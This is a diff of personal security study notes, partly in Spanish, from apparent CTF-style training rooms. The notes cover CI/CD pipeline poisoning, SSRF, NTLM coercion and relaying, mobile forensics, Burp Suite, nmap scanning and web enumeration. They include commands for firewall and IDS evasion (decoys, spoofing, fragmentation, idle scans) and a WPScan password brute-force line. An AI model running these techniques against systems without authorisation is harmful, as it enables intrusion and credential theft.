+Objetivos
+- aprender sobre ejecuciones de pipelines envenenadas
+- entender como tener CI/CD seguros
+- una introduccion a secure software development lifecycle y DevSecOps
+- aprender sobre mejores practicas de CI/CD
+
+Gitlab y SDLC cocepts
+- plataforma que permite la colaboracion y automatizacion a travez del desarrollo de vida del software
+- conceptos de GitLab:
+   → Version control system: aqui se puede encontrar los cambio que se van haciendo al codigo
+   → CI/CD pipelines: automatizacion de la creacion, testeo y despliegue del sistema
+   → Escaneo de seguridad: tiene incorporacion de SAST, DAST y escaneo de contenedores
+
+CI/CD
+- Continuous integration: creacion y testeo del codigo que se va subiendo, tambien se hacen las validaciones y escaneos de seguridad
+- Continuous deployment: aqui se envia el sistema a los diferentes entornos ya sea staging, sandbox o produccion
+
+DevSecOps
+- se hace el uso de seguridad en los pipelines de CI/CD
+
+CI/CD Attacks: PPE
+- poisoned pipeline execution
+- este ataque compromete componentes o el entorno en el SDLC
+- aqui el atacante tiene acceso al sistema de control (Git)</rich_text>
+      </node>
+      <node name="day 21" unique_id="222" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703187442" ts_lastsave="1703187454">
+        <rich_text>DevSecOps, Yule be poisoned: A pipeline of insecure code
+
+Objetivos:
+- entender cuan grandes operan los entornos de CI/CD
+- Explorar indirectamente ejecuciones de pipilenes envenados y como pyeden ser explotados con git
+- aplicar explotacion de CI/CD a entornos grandes de CI/CD 
+
+CI/CD environment
+- pasos generales: desarrollo, crecion, testeo y despliegue
+- estos pueden ser separados en diferentes sistemas
+
+Plataformas de automatizacion
+- se pueden tener dos tipos locales y remotas, travis CI es remota, mientras que jenkins es local
+- estas corren sobre agentes para crear el proyecto
+- estas plataformas pueden crear y configurar los entornos
+
+envenamiento indirect en ejecucion de pipelines
+- si el atacante no tiene acceso de escritura, es posible violar esta seguridad de forma indirecta modificando el alcance de la ejecucion del pipeline
+- puede aprvecharse que en un repo se tenga la proteccion que dependa de otro que probablemente no tenga esa proteccion y haciendo uso de esto pueda modificar cosas del primero</rich_text>
+      </node>
+      <node name="day 22" unique_id="223" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703289733" ts_lastsave="1703290686">
+        <rich_text>SSRF, Jingle your SSFR bels: A merry command and control hackventure
+
+Objetivos:
+- entender server-side request forgery (SSRF)
+- qeu tipos de SSRF son usados para explotar vulnerabilidades
+- prerequisitos pra explotar vulnerabilidades
+- como trabaja el ataque
+- como explotar la vulnerabilidad
+- mitigar medidas para proteccion
+
+Que es SSRF
+- es una vulnerabilidad de seguridad que ocurre cuando el atacante tiene acceso desde una aplicacion web, ya sea interno o externo
+- tipos:
+   → Basic, se envia una peticion elaborada al servidor vulnerable ya sea a recursos internos o externos, accesos publicos
+   → Blind SSRD, no se ve directamente la respuesta desde la peticion, se infiere la informacion usando las respuestas u observando los errores de mensaje
+   → Semi-Blind SSRD, no se recive directamente la respuestaen su explorador o aplicacion
+
+Prerequisitos para exploracion
+- vulnerable input points, se tiene campos suceptibles a manipulacion como URLs o archivos que se pueden subir
+- Lack of input validation, no se tiene validacion ni sanitizacion efectiva, se permite enviar peticiones maliciosas
+
+Como trabaja
+- Identificando las entradas vulnerables, se encuentra un input field que puede ser manipulado, este puede ser un parametro en la url, un endpoint o un parametro en la peticion
+- manipulando la entrada, se da una URL maliciosa u otro payload, este puede ser una url al servidor internos, bucle hacia la direccion o un servidor externo que puede controlar al objketivo
+- peticion a recursos no autorizados, se busca por medio de la peticion obtener acceso a recursos internos, servicios sensitivos o sistemas externos
+- explotar la respuesta, este puede proveer informacion importante, como datos internos del servidor, credenciales o alguna otra cosa para poder explotar</rich_text>
+      </node>
+      <node name="day 23" unique_id="224" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703380325" ts_lastsave="1703817530">
+        <rich_text>Coerced Authentication, relay all the way
+
+Objetivos:
+- lo basico de red para compartir archivos
+- entender autenticacion NTLM
+- como el ataque de coercion trabaja para autenticacion NTLM 
+- como las respuestas trabajan para el ataque de coercion de autenticacion
+- forzando la coercion de autenticacion usando archivos lnk
+
+Introduccion
+- conocer la autenticacion NTLM y como las amenzas pueden crear ataques de autenticacion de coercion
+
+Compartir es demostrar interes (sharing is caring)
+- se tiende a pensar que las computadoras son dispositivos aislados, pero el verdadero poder de una computadora viene cuando se conectan por red
+- esto viene mucho cuando se qieren compartir recursos
+- muchos de esto ayuda  poder tener lugares centralizados donde se puede acceder a documentos y estos estar protegidos por autenticacion
+- a pesar de todo no siempre se tiene el control de compartir archivos de forma segura, esto puede causar dos errores:
+   → si un atacante gana acceso puede obtener informacion sensitiva
+   → si tiene acceso de escritura puede modificar archivos que sean importantes o mantenerse sobre ataque
+
+NTLM autenticacion
+- SMB permite conectarse cliente-servidor, sin embargo a este se le han encontrado multiples vulnerabilidades
+- NetNTLM, referido a windows authentication, permite a la aplicacion hacer un middleman entre el cliente y el AD.
+- este se usa en varios servicios incluidos SMB y RDP
+- el usuario manda peticion al server, este responde con un ?challenge?, el usuario cifra su password con este challenge, para crear una respuesta y es enviada de nuevo al servidor, el servido pasa ambos al controlador de dominio, este se verifica para dar el acceso
+- para ganar acceso no autorizado se deberia interceptar esta autenticacion y los challenges
+
+</rich_text>
+      </node>
+      <node name="day 24" unique_id="225" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703454446" ts_lastsave="1703457827">
+        <rich_text>Mobile analysis, You are on the naughty list, Mc Greedy
+
+Objetivos
+- Procedimientos para collecionar evidencia digital
+- los retos con smartphones modernos
+- usar Autopsy Digital Forensics con una imagen actual de andriod
+
+Digital Forensic
+- metodo usado por la ciencia resolver crimenes
+- coleccionar evidencia desde las escenas del crimen
+- se debe analizar e interpretar la evidencia para determinar que paso en la escena del crimen
+- para la adquirir esta analisis se necesita una imagen cruda
+- una raw image se una copia bit a bit
+- es una parte escencial
+- uso de una cadena de custodia, concepto legal usado para seguir la pocesion y manejo de evidencia, colecionada en una escena de crimen que es presentada en la corte
+
+Adquiriendo una imagen digital forense
+- esto puede representar un reto, dependiendo del dispostivo
+- 4 tipos de adquisicion de imagenes forenses
+   → Static acquisition: imagen bit a bit del dispositivo apagado
+   → Live acquisition: image bit a bit del dispositivo prendido
+   → Logical acquisition: una lista selecta de archivos copiados del archivo
+   → Sparse acquisition: fragmentos seleccionados de datos sin asignar, esto contiene datos borrados
+- considera los sigueintes escenarios
+   → el tamaño de la computadora apagada
+   → como parte de una escena del crimen, el investigador del crimen debe trabajar con la compu prendida
+
+Una computadora que esta apagada
+- se sabe que por default el disco no esta encriptado
+- no se debe prender la compu para no tener cambios en el disco
+- se clona el HDD o SDD removiendolo de la laptop y clonandolo
+- pasos:
+   → se usa un write blocker, clona sin ningun riesgo de modificar la data original
+   → se obtiene una una imagen raw o equivalente
+   → finalmente, necesitamos un dispositivo donde guardar la imagen
+
+Una computadora que esta prendida
+- en este caso se debe de apagar
+- si esta cifrada la data se debe de tener el password
+
+Obteniendo la imgen de un smartphone
+- los smartphones modernos ahora estan cifrados por defecto
+
+Cifrado en smart phones
+- desde android 4.4 introduce cifrado de disco completados
+- el telefono no puede entrar sin antes proveer el password
+- android 7 infroduce direct boot, un modo de archivo basado en cifrado
+- en android 9 y mayores se puede cifrar una SD
+- desde andoid 6 el cifrado es forsozo
+- iOS viene por default, usando filed'based encryption</rich_text>
+      </node>
+    </node>
+    <node name="burpsuit" unique_id="226" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703562346" ts_lastsave="1704218809">
+      <node name="the basics" unique_id="227" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703627307" ts_lastsave="1703817992">
+        <rich_text>is a web application security testing framework
+
+introduction a burpsuite
+comprender el uso de varias herramientas disponibles del framework
+una guia detallada del proceso de instalacion de burp suite
+navigar y configurar burp suite
+
+el core de burp suite es burp proxy
+
+es un framework basado en java, diseñado para servir como como una solucion comprensiva para conduir penetraciones de aplicacion web
+simplemente captura y activa la manipulacion de todo el trafico HTTP/HTTPS entre el explorador web y el servidor web
+para entender como trabajar con esto es necesario entender como funcionan las secciones del framework
+la habilidad de interceptar, ver y modificar las peticiones web
+
+existen diferentes versiones, community edition, professional y empresarial
+
+Features:
+- Proxy, es la parte mas renombrada, permite interceptar y modificar las peticiones y respuestas
+- Repeater, otra parte bien conocida, permite capturar, modificar y reenviar la misma peticion multples veces, se hace cuando se tiene prueba-error, por ejemplo SQLi o probar la funcionalidad de un endpoint para vulnerabilidades
+- Intruder, comunmente para ataques de fuerza bruta o endpoints desconocidos
+- Decoder, servicio para transformacion de datos, este puede decodificar la informacion capturada o codificar las cargas antes de enviarlas
+- Comparer, permite comparar dos piezas de datos por cada palabra o byte
+- Sequencer, se usa cuando se estan evualuando valores aleatorios, como valores de cookies u otro valor generado
+
+Introduccion
+- burp proxy es una herramienta fundamental y crucial que se tiene en burp suite
+- permite capturar peticiones y respuestas entre el usuario y el web server
+- este puede ser manipulado
+- puntos clave:
+   → interceptar peticiones, este debe nacer desde burp proxy, permite acciones como reenvio, eliminado, editado o enviarlo dentro de otros modulos
+   → tomar control, permite tomar control sobre el trafico web, para testear web apps
+   → capturar y logging, este puede ayudar para el analisis y revision de los requests
+   → soporte para websocket, ahora se permite la comunicacion por websocket
+   → logs and history, las peticiones pueden ser vistas en HTTP/WebSocket history
+- notables faetures en proxy settings
+   → intercepcion de repuestas, por default no viene activada se deben de activar con el checkbox en las reglas
+   → match and replace, este permite hacer uso de regex para modificar la entrada y salida de las peticiones, hace cambios dinamicos como modificar el user agent o manipular cookies
+
+el Target tab provee mas control sobre nuestro testeo:
+- site map, permite usar el mapa de la aplicacion web en forma de arbol, sirve para mejorar el crawling del objeto, explorando links entre paginas y mappeando los sitios externos posibles, esto ayuda a acumular data 
+- definicion de Issues, esta es una lista de vulnerabilidades web completa con descripciones y referencias
+- configuraciones de alcance, esto permite incluir o excluir especificos domios y/o IP
+
+Respondiendo a la carrera
+- una herramienta que se puede usar es Responder, hace uso de man-in-the-middle
+- en una LAN se puede envenenar cualquier Link-Local Multicast Name Resolution, NetBIOS Name Service y Web Proxy Auto-Discovery
+- En VPN, no es considerada como red local, por lo cual es imposible detectar la intercepcion y envenamiento
+
+Coercion no convencional
+- si no se puede escuchar y envenenar el request, debemos de crear uno propio, este es un nuevo tipo de ataque de vector: coercion
+- se pueden permitor dos tipos de ataques:
+   → si el password de la cuenta coercionada es debil se puede crackear el challenge de NetNTLM fuera de linea usando herramientas como hastcat o john the ripper
+   → si la configuracion es insuficiente se puede intentar mandar el challenge 
+- dos increibles y populares versiones de coercion son PrintSpooler y PetitPotam
+
+Alcance y objetivo
+- aspecto de burp proxy
+- captura y logging de de todo el trafico
+- este sirve para poder interceptar todo o prevenir algoq ue no se requiera
+
+Proxy HTTPs
+- probelmas con el TLS enabled
+- se debe bajar el certificado de </rich_text>
+        <rich_text link="webs http://burt/cert">http://burt/cert</rich_text>
+        <rich_text> y agregar al explorador</rich_text>
+      </node>
+      <node name="repeater" unique_id="228" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703818353" ts_lastsave="1703904881">
+        <rich_text>Introduction
+- advanced capabilities
+- learn how to manipulate and resend captured requests
+- explore the various options and functionalities available
+
+What is?
+- enables modify and resend intercepted requests
+- manipulate captured requests with burp proxy
+- is possible create manually requests
+- sections:
+   → Request list, is possible manage multiple requests
+   → Request control, this allos send request, cancel and navigate on request history
+   → Request and response view, this display request and response, in this is possible the edition
+   → Layout option, enable customize the layout of requests and responses
+   → Inspector, analyze and modify requests using raw editor
+   → Target, specied the IP or domain to which the requests are sent
+
+Basic Usage
+- use with proxy module and trnasmit to repeater for editing and resuming
+- send with right click and select send to repeater or using Ctrl + R
+
+Inspector
+- supplementary feature
+- use to obtain a visually organized breakdown of request and response
+- is possible use with proxy and repeater
+- is possible change values for example change HTTP/1 to HTTP/2
+- </rich_text>
+      </node>
+      <node name="intruder" unique_id="229" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703926025" ts_lastsave="1703999225">
+        <rich_text>Introduction
+- automated request manipulation and enables task such as fuzzing and brute-force
+- automated and customisable attacks
+- allow modify specific parts of a request and perform repetitive test with variations of input data
+- used with fuzzing and brute-force
+
+What is?
+- automated testint requests with variation of input values
+- this is captured from proxy modeule
+- using for burting force login, similar to wfuzz or ffuf
+- sub tabs:
+   → Positions, select type of attack and configure payloads
+   → Payloads, select values to insert into positions
+   → Resouce pool, not particulary useful in CE, 
+   → settings, configure attack behaviour
+- Fuzzing is discover for example subpaths in URL
+
+Positions
+- first step is examine ositions within the request where we want to insert our payloads
+- automatically attempts to identify the mos probable positions where payloads can be inserted
+
+Payloads
+- this create, assing and configure payloads
+- payloads set:
+   → select type of payload
+   → with attack types only one option
+- settings
+   → specific options to current payload
+- Processing
+   → define rules to apply in each payload
+   → is possible capitalize words, skip payloads that match with regex or apply transformation or filtering
+- Encoding
+   → cutomize the encoding options for our payloads
+
+Sniper
+- is the default and most commonly used attack type
+- effective for single-position attacks, such as password brute-force or fuzzing for API endpoints
+- provide set of payloads like wordlist or a range of numbers
+
+Battering
+- this only use the same word in position options
+
+Pitchfork
+- similar a multiple sniper attacks simultaneously
+- use ibe payload set per position (max 20)
+- both list needs the same size
+
+Cluster bomb
+- allows us choice multiple payloads sets, on per position (max 20)
+- all payloadas are tested simultaneously</rich_text>
+      </node>
+      <node name="Other modules" unique_id="232" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704169288" ts_lastsave="1704175265">
+        <rich_text>Decode, comparare, sequencer and organizer tools
+operation with encoded text, enable comparison, allow the analysis of randomness
+
+Decoder
+- user manipulation capabilities
+- not only decodes data intercepted during an attack but also provides the function to encode our on data
+- create hashsums of data, providing a smart decode feature
+
+Comparer
+- used to compare data, in ASCII words or bytes
+
+Sequencer
+- evaluate the entropy, or randomness of tokens
+- token as Cross-Site Request Forgery
+- tow ways of capture:
+   → live: common method and default, pass a request that will generate a token to sequencer for analysis, this can make the same request thousands of times
+   → manual: load a list of preconfigured token samples
+
+Organizer
+- help to store and annotate copies of HTTP requests</rich_text>
+      </node>
+      <node name="extensions" unique_id="233" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704218809" ts_lastsave="1704219744">
+        <rich_text>extension can be written in various languages, like python and java
+python requires Jython</rich_text>
+      </node>
+    </node>
+    <node name="NMAP" unique_id="234" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704239776" ts_lastsave="1704398126">
+      <node name="Live Host Discovery" unique_id="235" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704239791" ts_lastsave="1704263847">
+        <rich_text>Introduction
+- efficent tool to help us handle repetitive tasks with
+   → Which systems are up?
+   → What services are running on these systems?
+- cover:
+   → ARP, discover live hosts
+   → ICMP, identify hosts
+   → TCP/UDP, send packages to TPC and UDP ports
+- steps:
+   → enumerate targets
+   → discover live hosts
+   → reverse-DNS lookup
+   → scan ports
+   → detect versions
+   → detect OS
+   → traceroute
+   → Scripts
+   → Write output
+
+Subnetworks
+- network segment is a group of computers connected using shared medium for example Ethernet switch or WiFi access point
+- network segment refers ti a physical connection
+- subnetwork refers to a logical connection
+- like reconnaissance, we want to discover more information about a group of hosts or about subnet
+- using ARP to discover live hosts, is a link layer protocol
+
+Enumerate Targets
+- list: MACHINE_IP URL1 URL2
+- range: 10.11.12.15-20
+- subnet: MACHINE_IP/30
+- with file: nmap -iL list_hosts.txt
+- check list of hosts: nmap -sL TARGETS
+
+Discover live hosts
+- use of TPC/IP layers
+   → ARP from link Layer, send a frame to the broadcast address on the network segment and asking a computer with a specific ip to response MAC
+   → ICMP frm network Layer, use ping type 8 (Echo) and Type 0 (Echo Reply)
+   → TCP from transport Layer, network scanning purposes, used when ICMP is blocked
+   → UDP from transport Layer
+
+Using ARP with nmap
+- use privileged user to use ARP requests
+- outside the local network, nmap use ICMP echo requests, TCP ACK to port 80, TCP SYN to port 443, and ICMP timestamp request
+- nmap by default use a ping scan to find lve hosts
+- to discover without port-scanning use: nmap -sn TARGET
+- ARP scan is possible only if you are on the same subnet
+- to use: nmap -PR -sn TARGETS, -PR is ARP scan
+- to check arp is possible use: arp-scan -l, to specify interface: arp-scan -I eth0 -l
+
+Using ICMP with nmap
+- send ping request TYPE8/echo to response ping reply TYPE0
+- many firewalls block ICMP echo
+- to use ICMP echo request: nmap -PE -sn TARGET, -sn to without port scan
+- exists another ICMP petition using Timestamp request TYPE13 and reply TYPE14, adding -PP, ex: nmap -PP -sn TARGET
+- another is using address mask queries, TYPE17 with repli TYPE18, using option -PM, ex: nmap -PM -sn TARGET
+
+Using TCP and UDP with nmap
+- TCP SYN Ping, send package with the SYN flag to TCP port 80, open port should reply with SYN/ACK, a closed port with RST, the specific state of the port is not significant here
+   → way: SYN - SYN,ACK - ACK, this OK
+   → way: SYN - SYN,ACK - RST, this closed
+- to use with TCP SYN: use -PS followed by the port, nmap -PS -sn TARGET
+- TCP ACK ping, sends a packet with ACK flag, by default use port 80
+- use option -PA followed by ports
+- example: nmap -PA -sn TARGET
+   → way: ACK - RST, tcp port is open or closed
+- UDP ping, this not expect to lead to any reply
+   → way: UDP packet, this is open
+   → way: UDP packet - ICMP Type3, Code 3, is closed
+- TO use: nmap -PU -sn TARGET
+- is possible use masscan
+- options of ports is in -P{x}{port}
+
+Using reverse-DNS lookup
+- by default is used reverse-DNS online hosts
+- because the hostnmaes can reveal a lot
+- if does not send DNS queries use -n
+- use -R to query the DNS server even for offline hosts, reverse-DNS lookup for all hosts
+- is possible use a specific DNS using --dns-servers DNS_SERVER</rich_text>
+      </node>
+      <node name="Basic port scans" unique_id="236" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704265336" ts_lastsave="1704333665">
+        <rich_text>TCP and UDP ports
+- identify a network service running on host
+- no more one services can listen on any TCP or UDP port
+- two states:
+   → open port, service is listening
+   → close port, service is not listening
+- states in nmap:
+   → Open, services is listening
+   → Closed, service is not listening, is accesible, is reachable and is not blocked by a firewall or other security appliance/programs
+   → Filtered, cannot determine if the port is open or closed, port is not accessible, firewall preventing nmap from reaching that port
+   → Unfiltered, cannot determine if the port is open or closed, the port is accessible, using an ACK scan -sA
+   → Open|Filtered, cannot determine whether the port is open or filtered
+   → Closed|Filtered, cannot determine whether the port is closed or filtered
+
+TCP Flags
+- different types of scans, depending of TCP header
+- the first 24 bytes is a TCP header
+- focus in TCP flags:
+   → URG, urgent point is significant, data is urgent, process immediately
+   → ACK, acknowledgement number is significant, , to acknowledge the receipt of a TCP segment
+   → PSH, push asking TCP to pass the data to the application promptly
+   → RST, used to reset connection, is possible send with firewall, when data is sent to a host and there is no service on the receiving end to answer
+   → SYN, initiate a TCP 3-way handshake and synchronize sequence numbers with the other host
+   → FIN, the sender has no more data to send
+
+TCP connect scan
+- works by completing the TCP 3-way handshake
+- to send a RST/ACK use -sT, only check open ports and no establishing connection
+- without root or sudoer only is possible discover open TCP ports
+- port response RST/ACK to close port
+- use of -F to fast mode, change from 1000 to 100 port scanner
+- -r to scan ports in consecutive order instead of random order
+
+TCP SYN scan
+- the default scan is SYN scan, using privileged user
+- required a privileged user to run
+- does not complete the TCP 3-way handshake
+- this does not establish a TCP connection
+- select this scan using -sS
+   → way: SYN - SYN/ACK - RST
+
+UDP scan
+- connection less potocol
+- cannot guarantee that a service listening on a UDP port would respond to our packets
+- an ICMP port unreachable error type3, code3 is returned
+- usgin with -sU
+   → way: UDP packet, no response open port
+   → way: UDP packet - ICMP type3, code 3, port is closed
+- ex: nmap -sU -F -v {ip}
+- priviledge user is necesary
+
+Fine-Tuning scope and performance
+- specify ports with:
+   → -p{list of ports using comma}
+   → -p{port}-{to port}
+   → -p-, to check all ports
+   → -F to 100 most common
+   → --top-ports {number to check}
+- scan timing control with: -T&lt;0-5&gt;, when -T0 us the slowest (paranoid) and -T5(fastest):
+   → paranoid (0)
+   → sneaky (1)
+   → polite (2)
+   → normal (3)
+   → Aggresive (4)
+   → insane (5)
+- to avoid alerts use 0 or 1
+- default is 3
+- 4 is used wirh CTFs and when learningto scan with practice
+- control rate using --min-rate {number} and --max-rate {number}
+- prallelization using --min-parallelism and --max-parallelism</rich_text>
+      </node>
+      <node name="Advanced port scans" unique_id="237" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704334161" ts_lastsave="1704396625">
+        <rich_text>an ACK flag is set when you want to acknowledge received data, ACK scan is like trying acknowledge (reconociendo) data that was neither sent nor received in the first place
+types of port scans:
+- Null scan
+- FIN scan
+- Xmas scan
+- Maimon scan
+- ACK scan
+- Window scan
+- Custom scan
+
+Cover soon:
+- Spoofing IP
+- Spoofing MAC
+- Decoy scan
+- Fragmented Packets
+- Idle/Zombie scan
+
+Evade Firewalls and IDS systems
+
+Null Scan
+- does not set any flag
+- use -sN option
+- this not trigger any response when irt reaches an open ports
+- way
+   → NULL - no response, open port
+   → NULL - RST,ACK, port us closed
+
+FIN Scan
+- send TCP package with flag FIN
+- using -sF to select this option
+- similar to Null scan
+- is not sure if the port is open or if a firewall is blocking
+   → way: FIN - Null response, open port
+   → way: FIN - RST,ACK, port is closed
+
+Xmas Scan
+- use name of Christmass tree lights
+- sets the FIN, PSH and URG flag
+- use -sX to select
+   → way: FIN,PSH,URG - Null response, open port
+   → way: FIN,PSH,URG - RST,ACK, port is closed
+- efficient in scanning a target behind stateless firewall
+
+Maimon Scan
+- FIN and ACK are set
+- send a RST packet as a response
+- certain BSD systems drop tha packet if it is an open port
+- to select: -sM
+- response is an RST packet
+   → way: FIN/ACK - RST, port open or closed, in some systems drop package if port is open
+
+ACK Scan
+- send packet with the ACK flag set
+- use -sA option
+- target response with RST
+   → way: ACK - RST, port is open or closed
+- used if there is a firewall in front of the target
+- to discover firewall rule sets and configuration
+
+Window Scan
+- almost the same as the ACK scan
+- this examines the TCP Windows field of the RST packet returned
+- on specific systems, this can reveal that the port is open
+- use -Sw to select this option
+   → way: ACK - RST, port is open or closed
+- against a linux system with no firewall will not provide much information
+- with repeat petition we get more satisfying result
+
+Custom Scan
+- TCP flag combination, use --scanflags
+- ex: --scanflag RSTSYNFIN to set RST,SYN,FIN
+
+Spoofing and decoys
+- target scan using spoofed IP address and even a spoofed MAC Address
+- beneficial in a situation where you can guarantee to cature the response
+- command: nmap -S SPOOFED_IP MACHINE_IP
+- save packages in spoofed ip
+- three steps:
+   → attacker send a packet with a poofed source IP address to the target machine
+   → Target machine replies to the spoofec IP address as the destination
+   → Attacker catures the replies to figure out open ports
+- expect the network interface using -e and explicity disbale ping with -Pn 
+- using same subnet as the target machine, you would be able to spoof your MAC address as well, using --spoof-mac SPOOFED_MAC, this only works if attacker and target is in the same Ethernet network or same WiFi
+- tha attacker might resort to using decoy to make it more challenging to be pinpointed, is simple coming from many IP address, this lost IP of attacker
+- use to decoy: nmap -D DECOY1,ME,DECOY2 MACHINE_IP
+
+Fragmented packets
+- Firewall, is a piece of software or hardware that permits packets to pass or block
+- IDS, intrusion detection system, use to select packets wit specific patterns or specific content signatures, this inspect data content, and check if is malicious pattern
+- fragmented packets, use option -f, to fragment packets
+   → divided into 8 bytes or less
+   → using -f -f or -ff split in 16 byte-fragment
+   → is possible change the value using --mtu
+   → to increment size of packets use --data-length NUM
+
+Idle/Zombie Scan
+- spoofing to check scanning stealthily
+- requieres an idle system connected to the network that you can cominicate with
+- test is used like idle host
+- running: nmap -sI ZOMBIE_IP MACHINE_IP
+- this is required:
+   → trigger the idle host to respond so that you can record the current IP ID on the idle host
+   → send a SYN packet to a TCP port on target
+   → trigger the idle machine again to response so that compare the new Ip ID with the one received earlier
+- if port is closed response to zombie host
+- if port is open response with SYN/ACK to zombie and this response with RST
+- possible the target machine does not respond by firewall
+
+Geting more details
+- to get more info use --reason
+- to know because namp concluded that the system is up or a particular port is open
+- for more details use -v or -vv
+- another mode is use -d or -dd to debugging details</rich_text>
+      </node>
+      <node name="Post port scans" unique_id="238" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704398126" ts_lastsave="1704405171">
+        <rich_text>Service Detection
+- before to detect open ports is necessary detect services 
+- adding -sV collect and determine service and version information for the open ports
+- is possible control the intensitity with --version-intensity LEVEL, ranges between 0 (lightest) and 9 or -sV --version-light has an intensity of 2 and -sV --version-all intensity of 9
+- -sV use 3-way handshake and establish the connection, use of -sS is nos possible
+
+OS Detection
+- is possible detect the OS using -O
+- nmap detect OS correctly the kernel version is possible was wrong
+- this fails or is possible that is possible by virtualization
+
+Traceroute
+- find of routers between you and the target, only add --traceroute
+
+NSE, nmap scripting engine
+- scripts in Lua
+- is possible use group of scripts
+- can install other user's scripts
+- run default scripts with: --script=default or adding -sC
+- is used to validations, are very instrusives
+
+Saving the output
+- formats:
+   → Normal
+      ⇒ this is similar to the output in terminal
+      ⇒ use -oN FILENAME
+   → Grepable
+      ⇒ use specific keywords or terms efficient
+      ⇒ use -oG FILENAME
+      ⇒ generally saved in 21 lines normal, in grepable is only 4 lines
+   → XML
+      ⇒ save in format XML
+      ⇒ use -oX FILENAME
+   → script Kiddie this is not recomend
+      ⇒ like hacker numbers</rich_text>
+      </node>
+    </node>
+    <node name="Upload vulnerabilities" unique_id="240" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704813054" ts_lastsave="1704859643">
+      <rich_text>Introduction
+- integral part of how we interact with web apps
+- applications for file upload features are limitless
+- when handled badly, file uploadscan also open vulnerabilities in the server
+- the way up to full remote code execution (RCE)
+- injection of malicious webpages, vulnerabilities such as XSS or CSRF
+- purpose:
+   → Overwritting existing files on a server
+   → uploading and executing shells on a server
+   → bypassing client-side filtering
+   → bypassing varios kinds of server-side filtering
+   → fooling content type validation checks</rich_text>
+    </node>
+    <node name="Web Enumeration" unique_id="241" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704850228" ts_lastsave="1705104318">
+      <rich_text>Introduction
+- vital in penetration testing
+
+Manual enumeration
+- use of browser developer console
+- check comments in html code
+
+Gobuster
+- is written in go
+- to install: sudo apt install gobuster
+
+Modes:
+- dir Mode: enumerate website directories, directory structure of a website, use of brute-forcing using wordlists
+- using dir mode: gobuster dir, using -u and -w option: gobuster dir -u {url} -w {wordlist}
+- this is common in capture the flag style room
+- common use of -x and --extensions to search for the contents of directories 
+- another use is .html, .php, .js and .css: gobuster dir -u {url} -w {wordlist} -x{.html,.css,.js}
+- The -k flag, has important use during penetration test and cpture the flag event, used with unvalid certification and continue scanning, is used with dir and vhost modes
+- dns Mode: brute force subdomains, same in penetration testing or capture the flag it is important check subdomains, is possible that in some subdomains exists a hole
+- to use: gobuster dns -d {domain} -w {wordlist}
+- vhost mode, brute force to virtual hosts
+- using: gobuster vhost -u {host} -w {wordlist}
+
+WPScan
+- enumerating and researching a few security vulnerability categories present in wordpress sites:
+   → sensitive information disclosure
+   → path discovery
+   → weak password policies
+   → presence of default installation
+   → testing web application firewalls
+- use information within a local database as a primary reference point
+- is recommended update this database before performing any scan
+
+Modes:
+- enumerating for installed themes
+   → with network tab is possible check this istalled data
+   → check with: wpscan --url {url} --enumerate t
+- installed plugins
+   → discovery listing, this is like ls in linux
+   → is possible enumerate plugins in the page
+   → check with: wpscan --url {url} --enumerate p
+- users:
+   → is possible use brute-forcing attacks
+   → with: wpscan --url {url} --enumerate u
+- vulnerable flag
+   → is possible see MITRE, NVD and CVEDetails in the name of plugins
+   → using option -v: wpscan --url {url} --enumerate vp
+- performing password attack
+   → using: wpscan --url {url} --password {txt file} --usernames {username}
+- adjust WPScan's aggressiveness (WAF)
+   → try t be least “noisy” as possible, 
+   → usng --plugin-detection and a aggressiveness profile (passive/aggressive) for example: --plugin-detention aggressive
+
+Nikto
+- released in 2001, popular vulnerability scanner, opensource and feature-rich
+- used for multiple types of webservers
+- discover:
+   → sensitive files
+   → outdated servers and programs
+   → common server and software missconfigurations
+
+Modes:
+- Basic scanning, use of flag -h and ip address or domain name: nikto -h {vulnerable_ip}
+- multiple hosts and ports, is possible provide multiple arguments in a way: nikto -h {ip} -p {list ports}</rich_text>
     </node>
   </node>
   <node name="English" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1624747640" ts_lastsave="1685941303">
@@ -12393,7 +14258,7 @@ Que es ML?
       </node>
     </node>
